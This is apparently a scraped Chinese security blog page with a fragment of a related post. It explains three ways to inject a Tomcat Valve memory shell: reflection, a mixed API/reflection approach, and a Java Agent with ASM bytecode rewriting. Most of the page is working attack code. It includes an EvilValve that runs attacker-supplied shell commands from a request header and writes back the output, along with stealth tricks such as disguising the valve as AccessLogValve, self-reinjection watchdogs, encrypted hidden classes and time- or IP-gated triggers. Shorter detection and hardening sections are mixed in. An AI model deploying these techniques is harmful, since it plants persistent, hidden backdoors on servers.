4 5 6 7 8 9 // 1. 获取WebappClassLoader的resources属性(StandardRoot) Field resourcesField = webappClassLoader.getClass().getDeclaredField(\u0026#34;resources\u0026#34;); resourcesField.setAccessible(true); Object standardRoot = resourcesField.get(webappClassLoader); // 2. 获取StandardRoot的context属性(StandardContext) Field contextField = standardRoot.getClass().getDeclaredField(\u0026#34;context\u0026#34;); contextField.setAccessible(true); Object standardContext = contextField.get(standardRoot); // 得到目标StandardContext 关键路径： WebappClassLoader→resources(StandardRoot) →context(StandardContext) 步骤3：获取Pipeline对象 text\r1 2 Method getPipelineMethod = standardContext.getClass().getMethod(\u0026#34;getPipeline\u0026#34;); Object pipeline = getPipelineMethod.invoke(standardContext); // StandardPipeline实例 步骤4：定义恶意Valve类（内存加载） 方案A：硬编码字节码（推荐）\ntext\r1 2 3 4 5 6 7 8 9 // 1. 预编译EvilValve.class并转为字节数组 byte[] evilValveBytecode = Base64.decode(\u0026#34;yv66vgAAADQAKgoABwAUBwAVCAAWCgAB...\u0026#34;); // 2. 反射调用ClassLoader.defineClass Method defineClassMethod = ClassLoader.class.getDeclaredMethod( \u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class\u0026lt;?\u0026gt; evilValveClass = (Class\u0026lt;?\u0026gt;) defineClassMethod.invoke( webappClassLoader, \u0026#34;com.evil.EvilValve\u0026#34;, evilValveBytecode, 0, evilValveBytecode.length); 方案B：动态生成字节码（ASM/Javassist）\ntext\r1 2 3 4 5 ClassWriter cw = new ClassWriter(0); cw.visit(Opcodes.V1_8, ACC_PUBLIC, \u0026#34;com/evil/EvilValve\u0026#34;, null, \u0026#34;java/lang/Object\u0026#34;, new String[]{\u0026#34;org/apache/catalina/Valve\u0026#34;}); // ... 生成invoke()方法字节码 ... byte[] evilValveBytecode = cw.toByteArray(); // 后续同方案A的defineClass调用 步骤5：实例化并注入Valve text\r1 2 3 4 5 6 7 8 // 实例化恶意Valve Constructor\u0026lt;?\u0026gt; constructor = evilValveClass.getDeclaredConstructor(); constructor.setAccessible(true); Object evilValve = constructor.newInstance(); // 获取Pipeline的addValve方法 Method addValveMethod = pipeline.getClass().getMethod(\u0026#34;addValve\u0026#34;, Valve.class); addValveMethod.invoke(pipeline, evilValve); // 注入到管道末尾 步骤6（可选）：控制注入位置 text\r1 2 3 4 5 6 7 8 9 10 11 // 获取Pipeline的valves数组 Field valvesField = pipeline.getClass().getDeclaredField(\u0026#34;valves\u0026#34;); valvesField.setAccessible(true); Valve[] valves = (Valve[]) valvesField.get(pipeline); // 创建新数组并将恶意Valve插入第二位（紧接AccessLogValve后） Valve[] newValves = new Valve[valves.length + 1]; System.arraycopy(valves, 0, newValves, 0, 1); // 保留第一个Valve newValves[1] = (Valve) evilValve; // 恶意Valve插入第二位 System.arraycopy(valves, 1, newValves, 2, valves.length - 1); valvesField.set(pipeline, newValves); 位置策略：插入在StandardContextValve之前（通常索引1）确保捕获所有请求。 三、恶意Valve类实现模板 text\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class EvilValve implements Valve { private static final String password = \u0026#34;X-TOKEN\u0026#34;; // 激活密码 @Override public void invoke(Request request, Response response) throws IOException, ServletException { // 1. 检查激活密码 String cmd = request.getHeader(password); if (cmd == null) { getNext().invoke(request, response); // 传递请求 return; } // 2. 执行命令并回显 try { String[] cmds = System.getProperty(\u0026#34;os.name\u0026#34;).contains(\u0026#34;win\u0026#34;) ? new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd} : new String[]{\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd}; Process p = Runtime.getRuntime().exec(cmds); InputStream in = p.getInputStream(); // ... 读取输出并写入response ... } catch (Exception e) { response.getWriter().write(\u0026#34;ERROR: \u0026#34; + e.getMessage()); } } // 其他Valve接口方法（空实现） @Override public String getInfo() { return null; } @Override public Valve getNext() { return null; } @Override public void setNext(Valve valve) {} @Override public void backgroundProcess() {} } 四、技术难点与规避方案 ClassLoader穿透问题\n场景：在BootstrapClassLoader中执行（如反序列化漏洞）\n方案：通过线程上下文类加载器传递\ntext\r1 Thread.currentThread().setContextClassLoader(webappClassLoader); Tomcat版本兼容性\nStandardRoot路径变化（Tomcat 8.0+）：\ntext\r1 2 3 4 // Tomcat 8.5+ 获取StandardContext Object resources = webappClassLoader.getResources(); Method getContextMethod = resources.getClass().getMethod(\u0026#34;getContext\u0026#34;); Object standardContext = getContextMethod.invoke(resources); 内存马隐身技巧\n类名伪装：com.sun.tools.javac.util.Context（仿JDK类） 字节码加密：运行时解密后再defineClass 惰性加载：首次匹配密码时才初始化命令执行逻辑 五、检测与防御手段 检测方案 Heap Dump分析\ntext\r1 2 3 SELECT * FROM java.lang.Object WHERE toString() LIKE \u0026#34;%StandardContextValve%\u0026#34; AND dominators() INCLUDES $.valves 定位StandardPipeline.valves数组中异常Valve RASP监控点\n拦截ClassLoader.defineClass()调用 监控StandardPipeline.addValve()反射调用栈 检测非初始化阶段新增的Valve 行为特征检测\n请求头包含X-TOKEN等固定标记 无关联页面的HTTP请求返回命令输出 防御措施 text\r1 2 \u0026lt;!-- 禁用Context的管道修改 (context.xml) --\u0026gt; \u0026lt;Context allowPipelineModification=\u0026#34;false\u0026#34;\u0026gt; 策略限制\n禁止反射调用defineClass()（SecurityManager） 锁定StandardPipeline.valves数组写权限 运行时加固\ntext\r1 -javaagent:rasp_agent.jar=block_unauth_valve 混合方式（利用 Tomcat API \u0026amp; 反射） 一、混合注入的核心优势 效率与稳定性的平衡： 使用Tomcat API直接调用核心方法，减少反射操作 对关键路径使用反射突破访问限制 比纯反射方式更稳定，减少版本兼容问题 降低检测风险： 减少反射调用次数，避免触发RASP的反射监控 直接API调用混入正常业务逻辑中更隐蔽 开发便利性： 代码可读性更高 调试和维护更简单 二、混合注入详细流程 前置条件 已获得执行环境（如通过JSP WebShell或反序列化漏洞） Tomcat API库（catalina.jar）在类路径中可用 当前ClassLoader是WebappClassLoader text\r1 2 3 // 获取当前Web应用的ClassLoader WebappClassLoader classLoader = (WebappClassLoader) Thread.currentThread().getContextClassLoader(); 步骤1：获取StandardContext对象（混合方式）\n方法A：通过ServletContext（推荐） text\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // 在JSP/Servlet环境中可直接获取request ServletRequest request = ...; // 获取ServletContext ServletContext servletContext = request.getServletContext(); // 反射获取ApplicationContext Field appCtxField = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); appCtxField.setAccessible(true); ApplicationContext appCtx = (ApplicationContext) appCtxField.get(servletContext); // 反射获取StandardContext Field stdCtxField = appCtx.getClass().getDeclaredField(\u0026#34;context\u0026#34;); stdCtxField.setAccessible(true); StandardContext standardContext = (StandardContext) stdCtxField.get(appCtx); 方法B：通过ClassLoader（无request时） text\r1 2 3 4 5 6 7 8 // 反射获取WebappClassLoader的resources字段 Field resourcesField = WebappClassLoader.class.getDeclaredField(\u0026#34;resources\u0026#34;); resourcesField.setAccessible(true); StandardRoot standardRoot = (StandardRoot) resourcesField.get(classLoader); // 直接API调用获取Context Context context = standardRoot.getContext(); // Tomcat 8.5+ StandardContext standardContext = (StandardContext) context; 步骤2：获取Pipeline对象（直接API）\ntext\r1 2 // 直接调用StandardContext的API方法 Pipeline pipeline = standardContext.getPipeline(); 步骤3：创建恶意Valve实例\n方法A：动态类定义（无文件落地） java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // 定义恶意Valve类（简化版） public class StealthValve extends ValveBase { private static final String TRIGGER_HEADER = \u0026#34;X-Health-Check\u0026#34;; @Override public void invoke(Request request, Response response) { if (request.getHeader(TRIGGER_HEADER) != null) { // 命令执行逻辑... } getNext().invoke(request, response); } } // 在内存中编译类（使用Java Compiler API） JavaCompiler compiler = ToolProvider.getSystemJavaCompiler(); StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, null); // 动态生成源码 String sourceCode = \u0026#34;...\u0026#34;; // 完整的StealthValve源码 JavaFileObject source = new SimpleJavaFileObject(URI.create(\u0026#34;string:///StealthValve.java\u0026#34;), JavaFileObject.Kind.SOURCE) { public CharSequence getCharContent(boolean ignoreEncodingErrors) { return sourceCode; } }; // 编译到内存 CompilationTask task = compiler.getTask(null, fileManager, null, null, null, Arrays.asList(source)); task.call(); // 加载编译后的类 Class\u0026lt;?\u0026gt; valveClass = classLoader.loadClass(\u0026#34;com.example.StealthValve\u0026#34;); Valve evilValve = (Valve) valveClass.newInstance(); 方法B：字节码注入（ASM增强） text\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // 使用ASM动态生成Valve字节码 ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES); cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, \u0026#34;com/evil/HealthCheckValve\u0026#34;, null, \u0026#34;org/apache/catalina/valves/ValveBase\u0026#34;, null); // 生成invoke方法... MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, \u0026#34;invoke\u0026#34;, \u0026#34;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V\u0026#34;, null, null); // 方法逻辑：检查Header-\u0026gt;执行命令-\u0026gt;回传结果 mv.visitCode(); // ... 字节码指令 ... mv.visitEnd(); // 定义类 byte[] bytecode = cw.toByteArray(); Class\u0026lt;?\u0026gt; valveClass = classLoader.defineClass( \u0026#34;com.evil.HealthCheckValve\u0026#34;, bytecode, 0, bytecode.length); Valve evilValve = (Valve) valveClass.newInstance(); 步骤4：注入Valve到管道（API+反射）\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // 直接API方式添加Valve pipeline.addValve(evilValve); // 调整位置到关键节点（反射操作） Field valvesField = pipeline.getClass().getDeclaredField(\u0026#34;valves\u0026#34;); valvesField.setAccessible(true); Valve[] valves = (Valve[]) valvesField.get(pipeline); // 查找StandardContextValve的位置 int targetIndex = -1; for (int i = 0; i \u0026lt; valves.length; i++) { if (valves[i] instanceof StandardContextValve) { targetIndex = i; break; } } // 在StandardContextValve前插入 if (targetIndex != -1) { Valve[] newValves = new Valve[valves.length + 1]; System.arraycopy(valves, 0, newValves, 0, targetIndex); newValves[targetIndex] = evilValve; System.arraycopy(valves, targetIndex, newValves, targetIndex + 1, valves.length - targetIndex); valvesField.set(pipeline, newValves); } 三、高级隐蔽技术 1. Valve伪装技术\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // 继承官方Valve类，减少特征 public class AccessLogValveProxy extends AccessLogValve { private Valve original; private Valve malicious; public AccessLogValveProxy(Valve original) { this.original = original; this.malicious = createMaliciousValve(); } @Override public void invoke(Request request, Response response) { // 恶意逻辑检查 if (isMaliciousRequest(request)) { malicious.invoke(request, response); return; } // 正常逻辑 original.invoke(request, response); } // 替换原始Valve public static void replaceOriginalValve(Pipeline pipeline) { Valve[] valves = pipeline.getValves(); for (int i = 0; i \u0026lt; valves.length; i++) { if (valves[i] instanceof AccessLogValve) { valves[i] = new AccessLogValveProxy(valves[i]); break; } } } } 2. 自保护机制 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // 在Valve中添加自检和恢复逻辑 public void invoke(Request request, Response response) { // 1. 检查自身是否仍在管道中 if (!isValveInPipeline(this)) { reinjectSelf(); // 重新注入 } // 2. 检查其他内存马是否存在 if (!isBackdoorPresent()) { deploySecondaryBackdoor(); // 部署备用后门 } // 3. 正常恶意逻辑... } // 定时检查线程 private void startWatchdog() { new Thread(() -\u0026gt; { while (true) { checkValveStatus(); checkSecurityTools(); Thread.sleep(300000); // 5分钟检查一次 } }).start(); } 3. 上下文感知触发 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // 基于请求上下文动态激活 private boolean shouldActivate(Request request) { // 1. 检查特定Header if (request.getHeader(\u0026#34;X-Health-Check\u0026#34;) != null) return true; // 2. 检查特殊URL模式 String uri = request.getRequestURI(); if (uri.contains(\u0026#34;;jsessionid=\u0026#34;)) { String sessionPart = uri.split(\u0026#34;;\u0026#34;)[1]; return validateSessionToken(sessionPart); } // 3. 检查特定Cookie值 Cookie[] cookies = request.getCookies(); for (Cookie cookie : cookies) { if (\u0026#34;debug_mode\u0026#34;.equals(cookie.getName())) { return checkCookieSignature(cookie.getValue()); } } // 4. 时间窗口激活 long currentTime = System.currentTimeMillis(); return (currentTime % 60000) \u0026lt; 5000; // 每分钟激活5秒 } 四、检测与防御方案 检测技术\n运行时管道分析\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public void monitorValves() { StandardContext ctx = getCurrentContext(); Pipeline pipeline = ctx.getPipeline(); Valve[] valves = pipeline.getValves(); for (Valve valve : valves) { // 检测未签名的Valve if (!isSigned(valve.getClass())) { alertSuspiciousValve(valve); } // 检测类加载来源 if (valve.getClass().getClassLoader() != ctx.getLoader().getClassLoader()) { alertForeignClassLoader(valve); } } } 字节码校验技术\ntext\r1 2 # 使用jvmti代理进行类校验 java -agentpath:valve_checker.so=org.apache.catalina.core.StandardPipeline ... 防御策略\nTomcat配置加固\nxml\r1 2 3 4 5 \u0026lt;!-- context.xml --\u0026gt; \u0026lt;Context\u0026gt; \u0026lt;Valve className=\u0026#34;org.apache.catalina.valves.ValveSecurityFilter\u0026#34; allowedValves=\u0026#34;org.apache.catalina.valves.*\u0026#34; /\u0026gt; \u0026lt;/Context\u0026gt; 运行时保护机制\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class ValveProtectionAgent { public static void premain(String args, Instrumentation inst) { inst.addTransformer((loader, className, classBeingRedefined, protectionDomain, classfileBuffer) -\u0026gt; { if (\u0026#34;org/apache/catalina/core/StandardPipeline\u0026#34;.equals(className)) { return patchPipelineClass(classfileBuffer); } return null; }); } private static byte[] patchPipelineClass(byte[] original) { // 使用ASM添加管道修改检查 ClassReader cr = new ClassReader(original); ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_FRAMES); cr.accept(new PipelineCheckAdapter(cw), 0); return cw.toByteArray(); } } 权限最小化\ntext\r1 2 3 # 启动脚本添加JVM参数 -Djava.security.manager \\ -Djava.security.policy=tomcat.policy tomcat.policy内容:\ntext\r1 2 3 4 5 grant codeBase \u0026#34;file:${catalina.home}/webapps/yourapp/-\u0026#34; { // 禁止Valve修改权限 permission java.lang.reflect.ReflectPermission \u0026#34;suppressAccessChecks\u0026#34;; permission java.lang.RuntimePermission \u0026#34;accessClassInPackage.org.apache.catalina.core\u0026#34;; }; 五、混合注入的演进趋势 模块化加载\njava\r1 2 3 4 5 6 7 8 9 10 public void invoke(Request request, Response response) { if (isTriggerRequest(request)) { // 动态加载加密模块 byte[] encryptedModule = fetchModule(request.getParameter(\u0026#34;m\u0026#34;)); Object module = loadModule(encryptedModule); executeModule(module, request, response); return; } getNext().invoke(request, response); } 云环境适配\njava\r1 2 3 4 5 6 // 检测云环境并调整行为 if (isRunningInCloud()) { activateCloudBackdoor(); } else { activateTraditionalBackdoor(); } API网关集成\njava\r1 2 3 4 5 6 7 8 9 10 // 伪装成合法的健康检查端点 if (\u0026#34;/health\u0026#34;.equals(request.getRequestURI())) { String action = request.getParameter(\u0026#34;action\u0026#34;); if (\u0026#34;exec\u0026#34;.equals(action)) { executeCommand(request.getParameter(\u0026#34;cmd\u0026#34;)); } else { sendHealthStatus(response); // 返回正常状态 } return; } 总结 Tomcat Valve型内存马的混合注入方式代表了当前高级威胁的典型手法：\nAPI与反射的精准结合- 在保持隐蔽性的同时提高可靠性 上下文感知的攻击逻辑- 基于环境动态调整行为 多层防御规避- 从类加载到管道操作全面伪装 Agent + ASM/Javassist 字节码注入 一、攻击流程详解 阶段1：Agent注入（JVM渗透）\njava\r1 2 3 4 5 6 7 8 9 10 11 12 // 获取目标Tomcat进程PID List\u0026lt;VirtualMachineDescriptor\u0026gt; vms = VirtualMachine.list(); for (VirtualMachineDescriptor vmd : vms) { if (vmd.displayName().contains(\u0026#34;catalina\u0026#34;)) { String pid = vmd.id(); // 动态加载Agent VirtualMachine vm = VirtualMachine.attach(pid); vm.loadAgent(\u0026#34;/path/to/agent.jar\u0026#34;, \u0026#34;injection_params\u0026#34;); vm.detach(); } } 阶段2：Agent核心逻辑\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class EvilAgent { public static void premain(String args, Instrumentation inst) { inst.addTransformer(new CriticalClassTransformer()); } static class CriticalClassTransformer implements ClassFileTransformer { private final Set\u0026lt;String\u0026gt; TARGET_CLASSES = Set.of( \u0026#34;org.apache.catalina.core.StandardPipeline\u0026#34;, \u0026#34;org.apache.catalina.core.StandardContextValve\u0026#34;, \u0026#34;org.apache.catalina.valves.AccessLogValve\u0026#34; ); @Override public byte[] transform(ClassLoader loader, String className, Class\u0026lt;?\u0026gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) { String dotClassName = className.replace(\u0026#39;/\u0026#39;, \u0026#39;.\u0026#39;); if (TARGET_CLASSES.contains(dotClassName)) { return modifyClass(dotClassName, classfileBuffer); } return null; } } } 二、字节码修改技术（ASM核心实现） 1. StandardPipeline类修改\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 private byte[] modifyStandardPipeline(byte[] origBytecode) { ClassReader cr = new ClassReader(origBytecode); ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_FRAMES); cr.accept(new ClassVisitor(Opcodes.ASM9, cw) { @Override public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) { MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions); // 在invoke方法中植入钩子 if (\u0026#34;invoke\u0026#34;.equals(name) \u0026amp;\u0026amp; \u0026#34;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V\u0026#34;.equals(desc)) { return new MethodVisitor(Opcodes.ASM9, mv) { @Override public void visitCode() { // 在方法开始处插入检测逻辑 mv.visitVarInsn(Opcodes.ALOAD, 1); // 加载Request mv.visitMethodInsn(Opcodes.INVOKESTATIC, \u0026#34;com/evil/EmbeddedLogic\u0026#34;, \u0026#34;checkRequest\u0026#34;, \u0026#34;(Lorg/apache/catalina/connector/Request;)Z\u0026#34;, false); Label skipLabel = new Label(); mv.visitJumpInsn(Opcodes.IFEQ, skipLabel); // 如果是恶意请求，直接返回 mv.visitInsn(Opcodes.RETURN); mv.visitLabel(skipLabel); super.visitCode(); } }; } return mv; } }, 0); return cw.toByteArray(); } 2. 嵌入式恶意逻辑类\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public class EmbeddedLogic { // 请求检测逻辑 public static boolean checkRequest(Request request) { String trigger = request.getHeader(\u0026#34;X-Health-Check\u0026#34;); if (trigger != null \u0026amp;\u0026amp; trigger.startsWith(\u0026#34;v1-\u0026#34;)) { String cmd = trigger.substring(3); executeCommand(cmd, request.getResponse()); return true; } return false; } // 命令执行逻辑（多平台兼容） private static void executeCommand(String cmd, Response response) { try { String[] commands; if (System.getProperty(\u0026#34;os.name\u0026#34;).toLowerCase().contains(\u0026#34;win\u0026#34;)) { commands = new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; } else { commands = new String[]{\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd}; } Process p = Runtime.getRuntime().exec(commands); try (InputStream in = p.getInputStream(); PrintWriter writer = response.getWriter()) { // 流式传输结果 byte[] buffer = new byte[4096]; int bytesRead; while ((bytesRead = in.read(buffer)) != -1) { writer.write(new String(buffer, 0, bytesRead)); } } p.waitFor(); } catch (Exception e) { // 错误处理（不留栈轨迹） response.getWriter().write(\u0026#34;ERROR: Command execution failed\u0026#34;); } } } 三、隐蔽性增强技术 1. 幽灵Valve技术\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // 修改StandardPipeline的addValve方法 @Override public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) { if (\u0026#34;addValve\u0026#34;.equals(name) \u0026amp;\u0026amp; \u0026#34;(Lorg/apache/catalina/Valve;)V\u0026#34;.equals(desc)) { return new MethodVisitor(Opcodes.ASM9, super.visitMethod(access, name, desc, signature, exceptions)) { @Override public void visitCode() { // 在添加Valve前进行检查 mv.visitVarInsn(Opcodes.ALOAD, 1); // 加载Valve参数 mv.visitMethodInsn(Opcodes.INVOKESTATIC, \u0026#34;com/evil/EmbeddedLogic\u0026#34;, \u0026#34;isGhostValve\u0026#34;, \u0026#34;(Lorg/apache/catalina/Valve;)Z\u0026#34;, false); Label normalPath = new Label(); mv.visitJumpInsn(Opcodes.IFEQ, normalPath); // 幽灵Valve：不加入主数组，加入隐藏列表 mv.visitVarInsn(Opcodes.ALOAD, 0); // this mv.visitVarInsn(Opcodes.ALOAD, 1); // Valve mv.visitMethodInsn(Opcodes.INVOKESTATIC, \u0026#34;com/evil/EmbeddedLogic\u0026#34;, \u0026#34;addToGhostList\u0026#34;, \u0026#34;(Lorg/apache/catalina/core/StandardPipeline;Lorg/apache/catalina/Valve;)V\u0026#34;, false); mv.visitInsn(Opcodes.RETURN); mv.visitLabel(normalPath); super.visitCode(); } }; } return super.visitMethod(access, name, desc, signature, exceptions); } 2. 动态代码解密\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class EmbeddedLogic { // 加密的命令执行逻辑 private static final byte[] ENCRYPTED_LOGIC = {0x12, 0x45, 0x78, ...}; public static void executeCommand(String cmd, Response response) { try { // 动态解密并执行 byte[] decrypted = decrypt(ENCRYPTED_LOGIC, getRuntimeKey()); MethodHandle mh = MethodHandles.lookup().defineHiddenClass( decrypted, true, MethodHandles.Lookup.ClassOption.NESTMATE) .findStatic(\u0026#34;Stealth\u0026#34;, \u0026#34;run\u0026#34;, MethodType.methodType(void.class, String.class, Response.class)); mh.invokeExact(cmd, response); } catch (Throwable e) { // 错误处理 } } // 基于环境动态生成密钥 private static byte[] getRuntimeKey() { String seed = System.getProperty(\u0026#34;user.name\u0026#34;) + System.getenv(\u0026#34;CATALINA_HOME\u0026#34;); return MessageDigest.getInstance(\u0026#34;SHA-256\u0026#34;) .digest(seed.getBytes()); } } 3. 环境感知伪装\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public static boolean checkRequest(Request request) { // 仅在生产环境激活 if (!\u0026#34;production\u0026#34;.equals(System.getProperty(\u0026#34;app.env\u0026#34;))) { return false; } // 检查请求来源IP（仅允许内网） String remoteAddr = request.getRemoteAddr(); if (!remoteAddr.startsWith(\u0026#34;192.168.\u0026#34;) \u0026amp;\u0026amp; !remoteAddr.startsWith(\u0026#34;10.\u0026#34;)) { return false; } // 检查请求时间（仅UTC 02:00-04:00激活） ZonedDateTime now = ZonedDateTime.now(ZoneId.of(\u0026#34;UTC\u0026#34;)); if (now.getHour() \u0026lt; 2 || now.getHour() \u0026gt; 4) { return false; } // 真正的触发逻辑... } 四、检测防御策略 1. 类完整性验证\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class ClassIntegrityVerifier { private static final Map\u0026lt;String, String\u0026gt; KNOWN_DIGESTS = Map.of( \u0026#34;org.apache.catalina.core.StandardPipeline\u0026#34;, \u0026#34;a1b2c3d4...\u0026#34;, \u0026#34;org.apache.catalina.core.StandardContextValve\u0026#34;, \u0026#34;e5f6g7h8...\u0026#34; ); public static void verify() { for (Class\u0026lt;?\u0026gt; clazz : Instrumentation.getAllLoadedClasses()) { String digest = calculateClassDigest(clazz); String expected = KNOWN_DIGESTS.get(clazz.getName()); if (expected != null \u0026amp;\u0026amp; !expected.equals(digest)) { SecurityLogger.alert(\u0026#34;Class tampered: \u0026#34; + clazz.getName()); } } } private static String calculateClassDigest(Class\u0026lt;?\u0026gt; clazz) { try { byte[] bytecode = getClassBytes(clazz); return DigestUtils.sha256Hex(bytecode); } catch (Exception e) { return \u0026#34;error\u0026#34;; } } } 2. 运行时行为监控\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class PipelineMonitorValve extends ValveBase { private final Valve original; private final AtomicInteger requestCount = new AtomicInteger(); public PipelineMonitorValve(Valve original) { this.original = original; } @Override public void invoke(Request request, Response response) { long start = System.nanoTime(); original.invoke(request, response); long duration = System.nanoTime() - start; // 异常检测逻辑 if (duration \u0026gt; TimeUnit.MILLISECONDS.toNanos(500)) { SecurityLogger.logLongInvocation(request, duration); } if (requestCount.incrementAndGet() % 1000 == 0) { SecurityLogger.snapshotPipelineState(); } } } 3. JVM层防护\ntext\r1 2 3 4 5 6 7 # 启用JVM安全策略 -Djava.security.manager -Djava.security.policy==tomcat.policy # 禁止非法Attach -Djdk.attach.allowAttachSelf=false -Djdk.attach.allowAttachSelf=true:com.trusted.app tomcat.policy示例：\ntext\r1 2 3 4 5 6 7 8 9 10 grant { // 禁止关键包修改 permission java.lang.RuntimePermission \u0026#34;modifyPackage.org.apache.catalina.core\u0026#34;; // 限制反射访问 permission java.lang.reflect.ReflectPermission \u0026#34;suppressAccessChecks\u0026#34;; // 禁止创建类加载器 permission java.lang.RuntimePermission \u0026#34;createClassLoader\u0026#34;; }; ","permalink":"http://localhost:1313/xvsf/posts/java%E5%86%85%E5%AD%98%E9%A9%ACtomcat-valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/","summary":"\u003ch1 id=\"java内存马tomcat-valve型的三种注入\"\u003eJava内存马——Tomcat Valve型的三种注入\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003e转载自：\u003c/strong\u003e\u003ca href=\"https://www.freebuf.com/articles/web/433972.html\"\u003e\u003cstrong\u003ehttps://www.freebuf.com/articles/web/433972.html\u003c/strong\u003e\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"核心原理\"\u003e核心原理\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e**Tomcat Pipeline \u0026amp; Valve：**Tomcat 使用责任链模式处理请求。\u003ccode\u003ePipeline\u003c/code\u003e包含多个\u003ccode\u003eValve\u003c/code\u003e，每个\u003ccode\u003eValve\u003c/code\u003e负责特定任务（如认证、日志、访问控制）。\u003ccode\u003eStandardWrapperValve\u003c/code\u003e(通常位于链尾) 最终调用 Servlet。\u003c/li\u003e\n\u003cli\u003e**\u003ccode\u003eStandardContext\u003c/code\u003e：**代表一个 Web 应用，持有其对应的\u003ccode\u003ePipeline\u003c/code\u003e对象 (\u003ccode\u003eStandardContext#getPipeline()\u003c/code\u003e)。\u003c/li\u003e\n\u003cli\u003e**目标：**将恶意\u003ccode\u003eValve\u003c/code\u003e注入到目标 Web 应用\u003ccode\u003eStandardContext\u003c/code\u003e的\u003ccode\u003ePipeline\u003c/code\u003e中，通常是插入在\u003ccode\u003eStandardContextValve\u003c/code\u003e(负责应用级路由) 和\u003ccode\u003eStandardWrapperValve\u003c/code\u003e(负责调用 Servlet) 之间，或者尽可能靠前（如紧接在\u003ccode\u003eAccessLogValve\u003c/code\u003e之后）。恶意 Valve 的\u003ccode\u003einvoke()\u003c/code\u003e方法检查特定请求特征，匹配则执行命令并截断管道（不再调用\u003ccode\u003egetNext().invoke()\u003c/code\u003e），直接返回响应。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"注入方式详解\"\u003e注入方式详解\u003c/h2\u003e\n\u003ch3 id=\"方式一纯反射注入无依赖\"\u003e方式一：纯反射注入（无依赖）\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e场景：\u003cstrong\u003e攻击者已通过漏洞（如反序列化、文件上传 Webshell、其他 RCE）获得代码执行能力，但\u003c/strong\u003e当前执行环境没有 Tomcat 的\u003ccode\u003ecatalina.jar\u003c/code\u003e等库依赖\u003c/strong\u003e（例如在\u003ccode\u003eBootstrap ClassLoader\u003c/code\u003e或\u003ccode\u003eCommon ClassLoader\u003c/code\u003e加载的类中执行）。这是最通用的方式。\u003c/p\u003e","title":"Java内存马——Tomcat Valve型的三种注入"},{"content":"Java 内存马第四篇 - Agent 内存马 四、 Java Agent 内存马 4.1 Java Agent示例 对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的**premain-Agent**，另一种是JVM启动之后加载的**agentmain-Agent**。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图\n4.1.1 premain-Agent 使用外部 MANIFEST.MF 文件 创建 创建Java Agent类 此处不写包名，避免后续的编译的 jar 包找不到类\njava\r1 2 3 4 5 6 7 8 9 10 11 12 //package com.premain.agent; import java.lang.instrument.Instrumentation; public class JavaAgentPremain { public static void premain(String args, Instrumentation inst) { for (int i =0 ; i\u0026lt;10 ; i++){ System.out.println(\u0026#34;premain-Agent\u0026#34;); } } } 创建MANIFEST.MF文件 最后必须有一个空行！\nplain\r1 2 3 4 5 6 Manifest-Version: 1.0 Premain-Class: JavaAgentPremain 